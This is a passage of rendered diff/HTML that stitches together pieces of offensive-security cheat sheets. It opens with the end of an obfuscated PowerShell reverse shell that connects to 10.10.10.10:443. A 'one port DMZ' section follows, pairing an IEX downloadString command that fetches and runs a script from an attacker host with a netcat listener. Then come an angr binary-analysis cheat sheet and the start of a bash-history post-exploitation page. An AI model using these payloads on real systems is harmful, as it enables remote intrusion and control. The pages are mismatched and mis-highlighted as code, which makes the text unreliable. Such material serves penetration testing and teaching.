+</span><span id="__span-9-54"><a id="__codelineno-9-54" name="__codelineno-9-54" href="#__codelineno-9-54"></a>                <span class="nv">$Poec56fd345</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Invoke-Expression</span> <span class="n">-Command</span> <span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">)</span>
+</span><span id="__span-9-55"><a id="__codelineno-9-55" name="__codelineno-9-55" href="#__codelineno-9-55"></a>            <span class="p">}</span>
+</span><span id="__span-9-56"><a id="__codelineno-9-56" name="__codelineno-9-56" href="#__codelineno-9-56"></a>            <span class="k">catch</span>
+</span><span id="__span-9-57"><a id="__codelineno-9-57" name="__codelineno-9-57" href="#__codelineno-9-57"></a>            <span class="p">{</span>
+</span><span id="__span-9-58"><a id="__codelineno-9-58" name="__codelineno-9-58" href="#__codelineno-9-58"></a>                <span class="nb">Write-Warning</span> <span class="s2">&quot;Something wrong&quot;</span> 
+</span><span id="__span-9-59"><a id="__codelineno-9-59" name="__codelineno-9-59" href="#__codelineno-9-59"></a>                <span class="nb">Write-Error</span> <span class="nv">$_</span>
+</span><span id="__span-9-60"><a id="__codelineno-9-60" name="__codelineno-9-60" href="#__codelineno-9-60"></a>            <span class="p">}</span>
+</span><span id="__span-9-61"><a id="__codelineno-9-61" name="__codelineno-9-61" href="#__codelineno-9-61"></a>            <span class="nv">$GFGFGBbvbgrefdf</span>  <span class="p">=</span> <span class="nv">$Poec56fd345</span> <span class="p">+</span> <span class="s1">&#39;PS &#39;</span> <span class="p">+</span> <span class="p">(</span><span class="nb">Get-Location</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s1">&#39;&gt; &#39;</span>
+</span><span id="__span-9-62"><a id="__codelineno-9-62" name="__codelineno-9-62" href="#__codelineno-9-62"></a>            <span class="nv">$ggh45RedCzIk</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$error</span><span class="p">[</span><span class="n">0</span><span class="p">]</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">)</span>
+</span><span id="__span-9-63"><a id="__codelineno-9-63" name="__codelineno-9-63" href="#__codelineno-9-63"></a>            <span class="nv">$error</span><span class="p">.</span><span class="n">clear</span><span class="p">()</span>
+</span><span id="__span-9-64"><a id="__codelineno-9-64" name="__codelineno-9-64" href="#__codelineno-9-64"></a>            <span class="nv">$GFGFGBbvbgrefdf</span> <span class="p">=</span> <span class="nv">$GFGFGBbvbgrefdf</span> <span class="p">+</span> <span class="nv">$ggh45RedCzIk</span>
+</span><span id="__span-9-65"><a id="__codelineno-9-65" name="__codelineno-9-65" href="#__codelineno-9-65"></a>
+</span><span id="__span-9-66"><a id="__codelineno-9-66" name="__codelineno-9-66" href="#__codelineno-9-66"></a>            <span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$GFGFGBbvbgrefdf</span><span class="p">)</span>
+</span><span id="__span-9-67"><a id="__codelineno-9-67" name="__codelineno-9-67" href="#__codelineno-9-67"></a>            <span class="nv">$zrt54789dvbgH</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
+</span><span id="__span-9-68"><a id="__codelineno-9-68" name="__codelineno-9-68" href="#__codelineno-9-68"></a>            <span class="nv">$zrt54789dvbgH</span><span class="p">.</span><span class="n">Flush</span><span class="p">()</span>  
+</span><span id="__span-9-69"><a id="__codelineno-9-69" name="__codelineno-9-69" href="#__codelineno-9-69"></a>        <span class="p">}</span>
+</span><span id="__span-9-70"><a id="__codelineno-9-70" name="__codelineno-9-70" href="#__codelineno-9-70"></a>        <span class="nv">$dGtrfokiudfjhvnjfe</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+</span><span id="__span-9-71"><a id="__codelineno-9-71" name="__codelineno-9-71" href="#__codelineno-9-71"></a>        <span class="k">if</span> <span class="p">(</span><span class="nv">$eDDfh987654567</span><span class="p">)</span>
+</span><span id="__span-9-72"><a id="__codelineno-9-72" name="__codelineno-9-72" href="#__codelineno-9-72"></a>        <span class="p">{</span>
+</span><span id="__span-9-73"><a id="__codelineno-9-73" name="__codelineno-9-73" href="#__codelineno-9-73"></a>            <span class="nv">$eDDfh987654567</span><span class="p">.</span><span class="n">Stop</span><span class="p">()</span>
+</span><span id="__span-9-74"><a id="__codelineno-9-74" name="__codelineno-9-74" href="#__codelineno-9-74"></a>        <span class="p">}</span>
+</span><span id="__span-9-75"><a id="__codelineno-9-75" name="__codelineno-9-75" href="#__codelineno-9-75"></a>    <span class="p">}</span>
+</span><span id="__span-9-76"><a id="__codelineno-9-76" name="__codelineno-9-76" href="#__codelineno-9-76"></a>    <span class="k">catch</span>
+</span><span id="__span-9-77"><a id="__codelineno-9-77" name="__codelineno-9-77" href="#__codelineno-9-77"></a>    <span class="p">{</span>
+</span><span id="__span-9-78"><a id="__codelineno-9-78" name="__codelineno-9-78" href="#__codelineno-9-78"></a>        <span class="nb">Write-Warning</span> <span class="s2">&quot;Something wrong!&quot;</span> 
+</span><span id="__span-9-79"><a id="__codelineno-9-79" name="__codelineno-9-79" href="#__codelineno-9-79"></a>        <span class="nb">Write-Error</span> <span class="nv">$_</span>
+</span><span id="__span-9-80"><a id="__codelineno-9-80" name="__codelineno-9-80" href="#__codelineno-9-80"></a>    <span class="p">}</span>
+</span><span id="__span-9-81"><a id="__codelineno-9-81" name="__codelineno-9-81" href="#__codelineno-9-81"></a><span class="p">}</span>
+</span><span id="__span-9-82"><a id="__codelineno-9-82" name="__codelineno-9-82" href="#__codelineno-9-82"></a>
+</span><span id="__span-9-83"><a id="__codelineno-9-83" name="__codelineno-9-83" href="#__codelineno-9-83"></a><span class="nb">Invoke-Shell</span> <span class="n">-Reverse</span> <span class="n">-world</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-CountrY</span> <span class="n">443</span>
+</span></code></pre></div>
+<hr />
+<h3 id="the-one-port-dmz-dlexec-issue">THE ONE PORT DMZ DL/EXEC ISSUE</h3>
+<p>Sometime it is not possible to work with 2 ports.</p>
+<ul>
+<li>1 Webserver to wait Powershell incoming downloaded script</li>
+<li>1 listener to catch the reverse shell.</li>
+</ul>
+<p>:information_source: The trick is to add a timestamp in the reverse shell script loaded in memory.</p>
+<p><img alt="" src="/images/poc9.png" title="DMZ DL/EXEC ISSUE" /></p>
+<h5 id="modification-part">MODIFICATION PART:</h5>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="p">}</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="p">--</span><span class="n">-SNIP</span><span class="p">---</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="nb">Start-Sleep</span> <span class="n">-s</span> <span class="n">10</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="nb">Invoke-Shell</span> <span class="n">-Reverse</span> <span class="n">-world</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-CountrY</span> <span class="n">443</span>
+</span></code></pre></div>
+<h5 id="process">PROCESS</h5>
+<ul>
+<li>Open your python webserver on 443
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>python<span class="w"> </span>-m<span class="w"> </span>SimpleHTTPServer<span class="w"> </span><span class="m">443</span>
+</span></code></pre></div></li>
+<li>Perform your remote command execution
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">powershell</span> <span class="s2">&quot;IEX(New-Object Net.WebClient).downloadString(&#39;https://attackerip/revshell.ps1&#39;)&quot;</span>
+</span></code></pre></div></li>
+<li>Target server download, load in memory and exec the script</li>
+<li>Stop your server
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Ctrl+C
+</span></code></pre></div></li>
+<li>Open your netcat listener on port 443
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">443</span>
+</span></code></pre></div></li>
+<li>Wait few seconds</li>
+<li>Get your reverse shell</li>
+</ul>
+<p><a href="https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md">&lt;- BACK TO MAIN MENU -&gt;</a>---
+title: Angr Cheat Sheet
+description: angr is a binary analysis platform for Python.
+tags:
+    - Reverse Engineering
+refs:
+    - https://docs.angr.io/
+date: 2024-02-18
+draft: false</p>
+<hr />
+<h2 id="installation">Installation</h2>
+<p>It’s recommended to create a Python virtual environment.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>python3<span class="w"> </span>-m<span class="w"> </span>venv<span class="w"> </span>myenv
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="nb">source</span><span class="w"> </span>myenv/bin/activate
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>pip3<span class="w"> </span>install<span class="w"> </span>angr
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>pip3<span class="w"> </span>install<span class="w"> </span>monkeyhex
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="basic-usage">Basic Usage</h2>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="kn">import</span> <span class="nn">angr</span><span class="o">,</span> <span class="nn">monkeyhex</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="n">proj</span> <span class="o">=</span> <span class="n">angr</span><span class="o">.</span><span class="n">Project</span><span class="p">(</span><span class="s1">&#39;/bin/id&#39;</span><span class="p">)</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="n">proj</span> <span class="o">=</span> <span class="n">angr</span><span class="o">.</span><span class="n">Project</span><span class="p">(</span><span class="s1">&#39;/bin/id&#39;</span><span class="p">,</span> <span class="n">load_options</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;auto_load_libs&#39;</span><span class="p">:</span> <span class="kc">False</span><span class="p">})</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="c1"># Basic information</span>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="n">proj</span><span class="o">.</span><span class="n">arch</span>
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="n">proj</span><span class="o">.</span><span class="n">entry</span>
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="n">proj</span><span class="o">.</span><span class="n">filename</span>
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="c1"># The loader</span>
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="n">proj</span><span class="o">.</span><span class="n">loader</span>
+</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="n">proj</span><span class="o">.</span><span class="n">loader</span><span class="o">.</span><span class="n">all_objects</span>
+</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a><span class="n">proj</span><span class="o">.</span><span class="n">loader</span><span class="o">.</span><span class="n">shared_objects</span>
+</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a><span class="n">proj</span><span class="o">.</span><span class="n">loader</span><span class="o">.</span><span class="n">min_addr</span>
+</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a><span class="n">proj</span><span class="o">.</span><span class="n">loader</span><span class="o">.</span><span class="n">max_addr</span>
+</span><span id="__span-16-17"><a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a>
+</span><span id="__span-16-18"><a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a><span class="c1"># Objects</span>
+</span><span id="__span-16-19"><a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a><span class="n">obj</span> <span class="o">=</span> <span class="n">proj</span><span class="o">.</span><span class="n">loader</span><span class="o">.</span><span class="n">main_object</span>
+</span><span id="__span-16-20"><a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a><span class="n">obj</span><span class="o">.</span><span class="n">entry</span>
+</span><span id="__span-16-21"><a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a><span class="n">obj</span><span class="o">.</span><span class="n">min_addr</span><span class="p">,</span> <span class="n">obj</span><span class="o">.</span><span class="n">max_addr</span>
+</span><span id="__span-16-22"><a id="__codelineno-16-22" name="__codelineno-16-22" href="#__codelineno-16-22"></a><span class="n">addr</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;strcmp&#39;</span><span class="p">]</span>
+</span><span id="__span-16-23"><a id="__codelineno-16-23" name="__codelineno-16-23" href="#__codelineno-16-23"></a><span class="n">obj</span><span class="o">.</span><span class="n">reserve_plt</span><span class="p">[</span><span class="n">addr</span><span class="p">]</span>
+</span><span id="__span-16-24"><a id="__codelineno-16-24" name="__codelineno-16-24" href="#__codelineno-16-24"></a>
+</span><span id="__span-16-25"><a id="__codelineno-16-25" name="__codelineno-16-25" href="#__codelineno-16-25"></a><span class="c1"># Blocks</span>
+</span><span id="__span-16-26"><a id="__codelineno-16-26" name="__codelineno-16-26" href="#__codelineno-16-26"></a><span class="n">block</span> <span class="o">=</span> <span class="n">proj</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">block</span><span class="p">(</span><span class="n">proj</span><span class="o">.</span><span class="n">entry</span><span class="p">)</span>
+</span><span id="__span-16-27"><a id="__codelineno-16-27" name="__codelineno-16-27" href="#__codelineno-16-27"></a><span class="n">block</span><span class="o">.</span><span class="n">pp</span><span class="p">()</span> <span class="c1"># pretty-print a disassembly to stdout</span>
+</span><span id="__span-16-28"><a id="__codelineno-16-28" name="__codelineno-16-28" href="#__codelineno-16-28"></a><span class="n">block</span><span class="o">.</span><span class="n">instructions</span> <span class="c1"># the number of instructions</span>
+</span><span id="__span-16-29"><a id="__codelineno-16-29" name="__codelineno-16-29" href="#__codelineno-16-29"></a><span class="n">block</span><span class="o">.</span><span class="n">instruction_addrs</span>
+</span><span id="__span-16-30"><a id="__codelineno-16-30" name="__codelineno-16-30" href="#__codelineno-16-30"></a>
+</span><span id="__span-16-31"><a id="__codelineno-16-31" name="__codelineno-16-31" href="#__codelineno-16-31"></a><span class="c1"># States</span>
+</span><span id="__span-16-32"><a id="__codelineno-16-32" name="__codelineno-16-32" href="#__codelineno-16-32"></a><span class="n">state</span> <span class="o">=</span> <span class="n">proj</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">entry_state</span><span class="p">()</span>
+</span><span id="__span-16-33"><a id="__codelineno-16-33" name="__codelineno-16-33" href="#__codelineno-16-33"></a><span class="n">state</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">rip</span> <span class="c1"># get the current instruction pointer</span>
+</span><span id="__span-16-34"><a id="__codelineno-16-34" name="__codelineno-16-34" href="#__codelineno-16-34"></a><span class="n">state</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">rax</span>
+</span><span id="__span-16-35"><a id="__codelineno-16-35" name="__codelineno-16-35" href="#__codelineno-16-35"></a><span class="n">state</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">proj</span><span class="o">.</span><span class="n">entry</span><span class="p">]</span><span class="o">.</span><span class="n">int</span><span class="o">.</span><span class="n">resolved</span>
+</span><span id="__span-16-36"><a id="__codelineno-16-36" name="__codelineno-16-36" href="#__codelineno-16-36"></a>
+</span><span id="__span-16-37"><a id="__codelineno-16-37" name="__codelineno-16-37" href="#__codelineno-16-37"></a><span class="c1"># Simulation Managers</span>
+</span><span id="__span-16-38"><a id="__codelineno-16-38" name="__codelineno-16-38" href="#__codelineno-16-38"></a><span class="n">simgr</span> <span class="o">=</span> <span class="n">proj</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">simulation_manager</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
+</span><span id="__span-16-39"><a id="__codelineno-16-39" name="__codelineno-16-39" href="#__codelineno-16-39"></a><span class="n">simgr</span><span class="o">.</span><span class="n">active</span>
+</span><span id="__span-16-40"><a id="__codelineno-16-40" name="__codelineno-16-40" href="#__codelineno-16-40"></a><span class="n">simgr</span><span class="o">.</span><span class="n">active</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">rip</span>
+</span><span id="__span-16-41"><a id="__codelineno-16-41" name="__codelineno-16-41" href="#__codelineno-16-41"></a><span class="n">simgr</span><span class="o">.</span><span class="n">step</span><span class="p">()</span>
+</span><span id="__span-16-42"><a id="__codelineno-16-42" name="__codelineno-16-42" href="#__codelineno-16-42"></a>
+</span><span id="__span-16-43"><a id="__codelineno-16-43" name="__codelineno-16-43" href="#__codelineno-16-43"></a><span class="c1"># Analyses</span>
+</span><span id="__span-16-44"><a id="__codelineno-16-44" name="__codelineno-16-44" href="#__codelineno-16-44"></a><span class="n">proj</span><span class="o">.</span><span class="n">analyses</span><span class="o">.</span> <span class="c1"># enter tab key to auto-completion in iPython</span>
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="binary-exploitation">Binary Exploitation</h2>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="kn">import</span> <span class="nn">angr</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>    <span class="n">proj</span> <span class="o">=</span> <span class="n">angr</span><span class="o">.</span><span class="n">Project</span><span class="p">(</span><span class="s1">&#39;./example&#39;</span><span class="p">,</span> <span class="n">load_options</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;auto_load_libs&#39;</span><span class="p">:</span> <span class="kc">False</span><span class="p">})</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>    <span class="k">def</span> <span class="nf">correct</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>        <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>            <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;Success&#39;</span> <span class="ow">in</span> <span class="n">state</span><span class="o">.</span><span class="n">posix</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>        <span class="k">except</span><span class="p">:</span>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>            <span class="k">return</span> <span class="kc">False</span>
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>    <span class="k">def</span> <span class="nf">wrong</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>        <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>            <span class="k">return</span> <span class="sa">b</span><span class="s2">&quot;Failed&quot;</span> <span class="ow">in</span> <span class="n">state</span><span class="o">.</span><span class="n">posix</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>        <span class="k">except</span><span class="p">:</span>
+</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>            <span class="k">return</span> <span class="kc">False</span>
+</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>
+</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>    <span class="n">simgr</span> <span class="o">=</span> <span class="n">proj</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">simulation_manager</span><span class="p">()</span>
+</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>    <span class="n">simgr</span><span class="o">.</span><span class="n">explore</span><span class="p">(</span><span class="n">find</span><span class="o">=</span><span class="n">correct</span><span class="p">,</span> <span class="n">avoid</span><span class="o">=</span><span class="n">wrong</span><span class="p">)</span>
+</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>    <span class="k">return</span> <span class="n">simgr</span><span class="o">.</span><span class="n">found</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">posix</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span><span id="__span-17-21"><a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>
+</span><span id="__span-17-22"><a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+</span><span id="__span-17-23"><a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
+</span><span id="__span-17-24"><a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a><span class="err">```</span><span class="o">---</span>
+</span><span id="__span-17-25"><a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a><span class="n">title</span><span class="p">:</span> <span class="n">Bash</span> <span class="n">History</span> <span class="n">Attack</span>
+</span><span id="__span-17-26"><a id="__codelineno-17-26" name="__codelineno-17-26" href="#__codelineno-17-26"></a><span class="n">description</span><span class="p">:</span> <span class="n">If</span> <span class="n">an</span> <span class="n">attacker</span> <span class="n">can</span> <span class="n">login</span> <span class="k">as</span> <span class="n">victim</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">system</span><span class="p">,</span> <span class="n">he</span> <span class="n">can</span> <span class="n">exploit</span> <span class="n">the</span> <span class="n">bash</span> <span class="n">history</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">victim</span> <span class="n">home</span> <span class="n">directory</span><span class="o">.</span>
+</span><span id="__span-17-27"><a id="__codelineno-17-27" name="__codelineno-17-27" href="#__codelineno-17-27"></a><span class="n">tags</span><span class="p">:</span>
+</span><span id="__span-17-28"><a id="__codelineno-17-28" name="__codelineno-17-28" href="#__codelineno-17-28"></a>    <span class="o">-</span> <span class="n">Post</span> <span class="n">Exploitation</span>
+</span><span id="__span-17-29"><a id="__codelineno-17-29" name="__codelineno-17-29" href="#__codelineno-17-29"></a>    <span class="o">-</span> <span class="n">Shell</span>
+</span><span id="__span-17-30"><a id="__codelineno-17-30" name="__codelineno-17-30" href="#__codelineno-17-30"></a><span class="n">refs</span><span class="p">:</span>
+</span><span id="__span-17-31"><a id="__codelineno-17-31" name="__codelineno-17-31" href="#__codelineno-17-31"></a><span class="n">date</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">24</span>
+</span><span id="__span-17-32"><a id="__codelineno-17-32" name="__codelineno-17-32" href="#__codelineno-17-32"></a><span class="n">draft</span><span class="p">:</span> <span class="n">false</span>
+</span><span id="__span-17-33"><a id="__codelineno-17-33" name="__codelineno-17-33" href="#__codelineno-17-33"></a><span class="o">---</span>
+</span><span id="__span-17-34"><a id="__codelineno-17-34" name="__codelineno-17-34" href="#__codelineno-17-34"></a>
+</span><span id="__span-17-35"><a id="__codelineno-17-35" name="__codelineno-17-35" href="#__codelineno-17-35"></a><span class="c1">## Bash History Unveiling</span>
+</span><span id="__span-17-36"><a id="__codelineno-17-36" name="__codelineno-17-36" href="#__codelineno-17-36"></a>
+</span><span id="__span-17-37"><a id="__codelineno-17-37" name="__codelineno-17-37" href="#__codelineno-17-37"></a><span class="o">**</span><span class="err">`</span><span class="o">.</span><span class="n">bash_history</span><span class="err">`</span><span class="o">**</span> <span class="ow">is</span> <span class="n">commonly</span> <span class="ow">in</span> <span class="n">user</span><span class="err">’</span><span class="n">s</span> <span class="n">home</span> <span class="n">directory</span><span class="o">.</span> <span class="n">In</span> <span class="n">order</span> <span class="ow">not</span> <span class="n">to</span> <span class="n">store</span> <span class="n">the</span> <span class="n">bash</span> <span class="n">history</span><span class="p">,</span> <span class="n">users</span> <span class="n">can</span> <span class="n">link</span> <span class="o">**</span><span class="err">`</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span><span class="err">`</span><span class="o">**</span> <span class="k">with</span> <span class="n">this</span> <span class="n">file</span> <span class="k">as</span> <span class="n">below</span><span class="o">.</span>
+</span><span id="__span-17-38"><a id="__codelineno-17-38" name="__codelineno-17-38" href="#__codelineno-17-38"></a>
+</span><span id="__span-17-39"><a id="__codelineno-17-39" name="__codelineno-17-39" href="#__codelineno-17-39"></a><span class="err">```</span><span class="n">bash</span>
+</span><span id="__span-17-40"><a id="__codelineno-17-40" name="__codelineno-17-40" href="#__codelineno-17-40"></a><span class="c1"># If victim uses bash...</span>
+</span><span id="__span-17-41"><a id="__codelineno-17-41" name="__codelineno-17-41" href="#__codelineno-17-41"></a><span class="n">ln</span> <span class="o">-</span><span class="n">sf</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">~/.</span><span class="n">bash_history</span>
+</span><span id="__span-17-42"><a id="__codelineno-17-42" name="__codelineno-17-42" href="#__codelineno-17-42"></a>
+</span><span id="__span-17-43"><a id="__codelineno-17-43" name="__codelineno-17-43" href="#__codelineno-17-43"></a><span class="c1"># If victim users zsh...</span>
+</span><span id="__span-17-44"><a id="__codelineno-17-44" name="__codelineno-17-44" href="#__codelineno-17-44"></a><span class="n">ln</span> <span class="o">-</span><span class="n">sf</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">~/.</span><span class="n">zsh_history</span>
+</span></code></pre></div>
+<h3 id="exploitation">Exploitation</h3>
+<p>If attackers can login as victim user, they can unlink <strong><code>/dev/null</code></strong> then allow the bash history to be stored. If <strong><code>HISTFILE</code></strong> variable does not appear in <strong><code>.bashrc</code></strong> or <strong><code>.profile</code></strong>, attackers can add this line in the file to store the bash history.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># If victim uses bash...</span>
